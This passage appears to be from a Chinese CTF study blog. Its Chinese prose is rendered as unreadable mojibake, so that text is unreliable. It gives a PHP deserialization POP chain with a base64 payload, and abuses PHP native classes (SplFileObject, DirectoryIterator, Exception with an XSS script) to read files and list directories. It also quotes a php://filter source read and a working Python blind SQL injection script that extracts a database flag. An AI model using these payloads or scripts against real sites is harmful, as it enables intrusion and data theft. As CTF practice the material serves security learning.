<p>å…ˆçœ‹çœ‹åˆ©ç”¨ç‚¹ï¼š</p>
</blockquote>
<blockquote>
<p>åº”è¯¥æ˜¯$_POST<a href="$_POST%5B'b'%5D">â€˜aâ€™</a>;</p>
</blockquote>
<blockquote>
<p>å°è¯•æ„é€ é“¾å­school::IPO() -&gt; school::__wakeup -&gt;classroom::hahaha-&gt;teacher</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;ing&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span>=<span class="hljs-string">&#x27;department&#x27;</span>;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;one class&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span>=<span class="hljs-string">&#x27;ong&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">school</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">classroom</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">teacher</span>();<br><span class="hljs-variable">$a</span>-&gt;department=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;leader=<span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br> <br>ç»“æœï¼š                      <br>Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjoyOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO319czoxMDoiaGVhZG1hc3RlciI7czozOiJvbmciO30=<br></code></pre></td></tr></table></figure>
<p>ä¸çŸ¥é“ä¸ºå•¥æˆ‘åœ¨åŸç åé¢ç›´æ¥æ„é€ æ­»æ´»è¾“å‡ºä¸äº†  </p>
<p>åˆè¯•äº†ä¸€æ¬¡ï¼Œå­¦åˆ°å¯¹äº†ä¸€ç§æ–°çš„æ„é€ è¯­æ³•  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$salary</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$rank</span>,<span class="hljs-variable">$salary</span> = <span class="hljs-number">10000</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;rank = <span class="hljs-variable">$rank</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;salary = <span class="hljs-variable">$salary</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$leader</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;leader = <span class="hljs-variable">$leader</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hahaha</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name != <span class="hljs-string">&#x27;one class&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;name != <span class="hljs-string">&#x27;ing&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="hljs-string">&#x27;department&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> True;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$department</span>,<span class="hljs-variable">$ceo</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;department = <span class="hljs-variable">$department</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;headmaster = <span class="hljs-variable">$ceo</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">IPO</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;headmaster == <span class="hljs-string">&#x27;ong&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakea</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;department-&gt;<span class="hljs-title function_ invoke__">hahaha</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">IPO</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">school</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">classroom</span>(<span class="hljs-string">&#x27;one class&#x27;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">teacher</span>(<span class="hljs-string">&#x27;ing&#x27;</span>,<span class="hljs-string">&#x27;department&#x27;</span>)),<span class="hljs-string">&#x27;ong&#x27;</span>);<br><br><span class="hljs-comment">// $a=new school();</span><br><span class="hljs-comment">// $b=new classroom();</span><br><span class="hljs-comment">// $c=new teacher();</span><br><span class="hljs-comment">// $a-&gt;department=$b;</span><br><span class="hljs-comment">// $b-&gt;leader=$c;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>ç”¨å¾—åˆ°çš„payloadä¼ getçš„â€™dâ€™</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">d</span>=Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjozOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO3M6MTU6IgB0ZWFjaGVyAHNhbGFyeSI7aToxMDAwMDt9fXM6MTA6ImhlYWRtYXN0ZXIiO3M6Mzoib25nIjt9<br></code></pre></td></tr></table></figure>
<p>æ­¤æ—¶ç”±äº</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;department-&gt;<span class="hljs-title function_ invoke__">hahaha</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">IPO</span>();<br>        &#125;<br>    &#125;<br><br><span class="hljs-comment">//ä¼šå”¤é†’</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">IPO</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;headmaster == <span class="hljs-string">&#x27;ong&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
<p>æ­¤æ—¶ä¼ å…¥çš„post aå’Œbå°±ä¼šæ‹¼æ¥è¿›</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br></code></pre></td></tr></table></figure>
<p>è¯•äº†ä¸€ä¸‹ä¸Šæ¬¡çš„file_get_contentsï¼Œä¸è¡Œï¼Œè¯•æƒ³äº†ä¸‹ï¼Œç›´æ¥æ‹¼è¿›å»ä¼šå¾—åˆ°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file_get_contents&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-comment">//è€Œä¸Šæ¬¡çš„æ˜¯</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=index.php&quot;</span>);<br></code></pre></td></tr></table></figure>
<p>è¿™ä¸ªè¿™ä¸ªnewå¯èƒ½è¦æ„å‘³ç€æ˜¯ç±»(class)çš„è¡¨è¾¾ï¼›<br>çœ‹wp<br>è¦ç”¨hpçš„å†…ç½®ç±»SplFileObjectæ¥è¯»å–æ–‡ä»¶å†…å®¹;  </p>
<h2 id="åŸç”Ÿç±»"><a href="#åŸç”Ÿç±»" class="headerlink" title="åŸç”Ÿç±»  "></a>åŸç”Ÿç±»  </h2><p>phpåŸç”Ÿç±»ï¼Œåº”è¯¥æŒ‡çš„æ˜¯phpå†…ç½®æœ‰ï¼Œä¸ç”¨å®šä¹‰çš„ç±»  </p>
<p>Error&#x2F;Exception XSS</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure>
<p>SplFileObject è¯»æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure>
<p>DirectoryIterator éå†ç›®å½•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;.&quot;</span>);<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$b</span>) &#123;<br><br>         <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>-&gt;<span class="hljs-title function_ invoke__">getFilename</span>() . <span class="hljs-string">&quot;\n&quot;</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>
<p>FilesystemIterator éå†ç›®å½•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;.&quot;</span>);<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$b</span>) &#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>-&gt;<span class="hljs-title function_ invoke__">getFilename</span>() . <span class="hljs-string">&quot;\n&quot;</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>


<hr>
<h2 id="title-note-19-ç›²æ³¨è„šæœ¬ç¼–å†™date-2025-03-27-21-30-53tags-notice"><a href="#title-note-19-ç›²æ³¨è„šæœ¬ç¼–å†™date-2025-03-27-21-30-53tags-notice" class="headerlink" title="title: note-19-ç›²æ³¨è„šæœ¬ç¼–å†™date: 2025-03-27 21:30:53tags: notice"></a>title: note-19-ç›²æ³¨è„šæœ¬ç¼–å†™<br>date: 2025-03-27 21:30:53<br>tags: notice</h2><h1 id="ç›²æ³¨è„šæœ¬ç¼–å†™"><a href="#ç›²æ³¨è„šæœ¬ç¼–å†™" class="headerlink" title="ç›²æ³¨è„šæœ¬ç¼–å†™"></a>ç›²æ³¨è„šæœ¬ç¼–å†™</h1><p>è™½ç„¶ä»¥å‰åšè¿‡ä¸€äº›ç›²æ³¨çš„é¢˜ï¼Œä¹Ÿèƒ½æ ¹æ®éœ€è¦æ”¹ä¸€ä¸‹è„šæœ¬ï¼Œä½†æ˜¯åŸºæœ¬éƒ½æ˜¯ç”¨ç½‘ä¸Šwpæˆ–aiå†™çš„è„šæœ¬ï¼Œè¿˜æ²¡æœ‰è‡ªå·±å†™è¿‡è„šæœ¬  </p>
<h2 id="CISCN-2019ååŒ—Day2-Web1"><a href="#CISCN-2019ååŒ—Day2-Web1" class="headerlink" title="[CISCN 2019ååŒ—Day2]Web1"></a>[CISCN 2019ååŒ—Day2]Web1</h2><p>å…ˆæ˜¯ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œ</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">All</span> You Want <span class="hljs-keyword">Is</span> <span class="hljs-keyword">In</span> <span class="hljs-keyword">Table</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> the <span class="hljs-keyword">column</span> <span class="hljs-keyword">is</span> <span class="hljs-string">&#x27;flag&#x27;</span><br>Now, just give the id <span class="hljs-keyword">of</span> passage<br></code></pre></td></tr></table></figure>
<p>æŠ“åŒ…å°±æ˜¯postä¸€ä¸ªidå‚æ•°ï¼Œæ ¹æ®æ•°å­—æ¥æ˜¾ç¤ºä¸åŒå†…å®¹<br>ç”¨bp fuzzäº†ä¸€ä¸‹ï¼Œæ²¡fuzzæ˜ç™½ï¼Œ<br>æ‰‹åŠ¨fuzzï¼Œæå¾—ä¸æ˜ç™½çš„<br>æœ€åè¿˜æ˜¯çœ‹äº†åˆ«äººçš„wp<br>ç„¶åå°è¯•è‡ªå·±å†™ç›²æ³¨è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># import requests</span><br><span class="hljs-comment"># str=&#x27;-&#125;&#123;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-comment"># #if((substr((select(flag)from(flag)),1,1)=&#x27;N&#x27;),1,2)</span><br><span class="hljs-comment"># flag=&quot;&quot;</span><br><span class="hljs-comment"># for i in range(1,100):</span><br><span class="hljs-comment">#     url=&#x27;http://node4.anna.nssctf.cn:28599/index.php&#x27;</span><br><span class="hljs-comment">#     for st in str:</span><br><span class="hljs-comment">#         sql=&quot;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=ascii(&#x27;&#123;&#125;&#x27;)),1,2)&quot;.format(i,st)</span><br><span class="hljs-comment">#         data=&#123;&quot;id&quot;:sql&#125;</span><br><span class="hljs-comment">#         re=requests.post(url,data=data,)</span><br><span class="hljs-comment">#         if &quot;Hello&quot; in re.text:</span><br><span class="hljs-comment">#             flag=flag+st</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#     print(flag)</span><br><br><span class="hljs-comment">#(0,128)äºŒåˆ†æ³•ï¼š</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">#str=&#x27;-&#125;&#123;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-comment">#if((substr((select(flag)from(flag)),1,1)=&#x27;N&#x27;),1,2)</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    url=<span class="hljs-string">&#x27;http://node4.anna.nssctf.cn:28599/index.php&#x27;</span><br>    sql=<span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&lt;64),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sql&#125;<br>    re=requests.post(url,data=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> re.text:<br>        <span class="hljs-keyword">for</span> st <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">64</span>):<br>            sql=<span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i,st)<br>            data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sql&#125;<br>            re=requests.post(url,data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> re.text:<br>                st=<span class="hljs-built_in">chr</span>(st)<br>                flag=flag+st<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç¬¬%dä¸ªå­—ç¬¦&quot;</span>%i)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>       <span class="hljs-keyword">for</span> st <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>,<span class="hljs-number">128</span>):<br>            sql=<span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i,st)<br>            data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sql&#125;<br>            re=requests.post(url,data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> re.text:<br>                st=<span class="hljs-built_in">chr</span>(st)<br>                flag=flag+st<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç¬¬%dä¸ªå­—ç¬¦&quot;</span>%i)<br>                <span class="hljs-keyword">break</span> <br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<h2 id="åœ¨å†™çš„æ—¶å€™é‡åˆ°çš„é—®é¢˜"><a href="#åœ¨å†™çš„æ—¶å€™é‡åˆ°çš„é—®é¢˜" class="headerlink" title="åœ¨å†™çš„æ—¶å€™é‡åˆ°çš„é—®é¢˜:"></a>åœ¨å†™çš„æ—¶å€™é‡åˆ°çš„é—®é¢˜:</h2><p>requestsè¯­å¥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">requests.(è¯·æ±‚æ–¹å¼ï¼Œgetæˆ–post)<br><br>re=requests.post(url,data,å¯é€‰å…¶å®ƒåŠŸèƒ½ï¼ˆå¦‚timeout=$ï¼‰)<br><br><span class="hljs-comment">#re.text å°±ç­‰äºæœåŠ¡å™¨è¿”å›å†…å®¹ä¸­çš„å­—ç¬¦å†…å®¹</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> re.text:<br><br>è¿˜æœ‰dataå†…å®¹çš„è¡¨ç¤º<br>data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sql&#125;<br></code></pre></td></tr></table></figure>


<blockquote>
<p>for st in (1,128):<br>å½“æ—¶åªçŒœæµ‹äº†flagçš„å‰ä¸¤ä¸ªå­—ç¬¦ï¼Œé—®äº†kimiï¼Œè¯´æˆ‘è¿™ä¸ª(1,128)çš„æ„æ€æ˜¯æ•°ç»„ï¼Œåªä¼šè¿›è¡Œä¸¤æ¬¡å¾ªç¯ğŸ˜…<br>æ­£ç¡®è¯­å¥<br>for st in range(64,128):</p>
</blockquote>
<p>ç¬¬ä¸€æ¬¡è„šæœ¬è·‘çš„å¾ˆæ…¢ï¼Œè€Œä¸”å¾ˆå®¹æ˜“ä¸æœåŠ¡å™¨æ–­è¿ï¼Œçœ‹åˆ«äººwpæœ‰ç”¨äºŒåˆ†æ³•çš„ï¼Œè‡ªå·±æ•´äº†ä¸ªäºŒåˆ†æ³•çš„ç‰ˆæœ¬å‡ºæ¥  </p>
<p>è¿™æ—¶åˆé‡åˆ°äº†å¦ä¸€ä¸ªé—®é¢˜<br>å½“åˆç”¨requestsæ—¶å­¦åˆ«äººwpåŠ ä¸Šäº†timeout&#x3D;10ï¼ŒåŠ¨ä¸åŠ¨å°±è¶…æ—¶</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">re</span>=requests.post(url,<span class="hljs-class"><span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>.timeout=10)</span><br></code></pre></td></tr></table></figure>
<p>ç„¶åå°±å»æ‰äº†timeoutï¼Œä½†è¿˜æ˜¯å¾ˆå®¹æ˜“æ–­è¿<br>äºæ˜¯åˆæœ‰äº†</p>
